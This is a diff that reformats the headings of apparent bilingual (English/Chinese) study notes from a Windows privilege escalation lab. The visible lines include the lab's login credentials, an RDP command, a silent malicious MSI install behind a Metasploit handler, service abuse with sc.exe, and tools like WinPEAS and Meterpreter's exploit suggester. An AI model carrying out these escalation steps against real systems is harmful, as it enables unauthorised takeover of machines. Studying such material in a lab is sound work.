@@ -1,10 +1,10 @@
-Windows Privilege Escalation : 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> User: thm-unpriv
-	--> Password: Password321
-	--> ip: 10.10.230.106
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	-->RDP :  
+## Windows Privilege Escalation : 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> User: thm-unpriv
+		--> Password: Password321
+		--> ip: 10.10.230.106
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> RDP :  
 		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.230.106 /u:thm-unpriv /p:'Password321'
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Unattended Windows Installations (無人值守的 Windows 安裝)
@@ -84,8 +84,7 @@ Windows Privilege Escalation :
 			--> 執行相應配置的Metasploit處理程序模組 => run
 			--> C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 			
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Abusing Service Misconfigurations : 濫用服務錯誤配置
+## Abusing Service Misconfigurations : 濫用服務錯誤配置
 	=> C:\Windows\system32> 
 	=> cmd : sc | Ps: sc.exe
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -186,9 +185,8 @@ Abusing Service Misconfigurations : 濫用服務錯誤配置
 				--> sc.exe start THMService
 			
 			--> cd ../../Users/Administrator/Desktop
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Abusing dangerous privileges :
-=> nt authority\system
+## Abusing dangerous privileges :
+	=> nt authority\system
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Windows Privileges
 		--> 檢查 權限 : whoami /priv
@@ -261,8 +259,7 @@ Abusing dangerous privileges :
 				
 			--> cd ../../Users/Administrator/Desktop
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Abusing vulnerable software :
+## Abusing vulnerable software :
 	--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.144.74 /u:thm-unpriv /p:'Password321'
 	
 	--> Unpatched Software
@@ -282,8 +279,7 @@ Abusing vulnerable software :
 				=> Local Group Memberships      *Administrators       *Users   
 		--> type C:\Users\Administrator\Desktop\flag.txt
             
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Tools of the Trade :
+## Tools of the Trade :
 	=> need 上傳到目標系統並在那裡運行它們  	
 	--> WinPEAS
 		--> 用於列舉目標系統以發現權限提昇路徑的腳本
@@ -313,9 +309,7 @@ Tools of the Trade :
 	--> Metasploit :
 		--> Meterpreter shell 
 			--> multi/recon/local_exploit_suggester 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-command : 
+## command : 
 	--> 權限 icacls : 
 		--> https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 		--> F - 完全存取權限
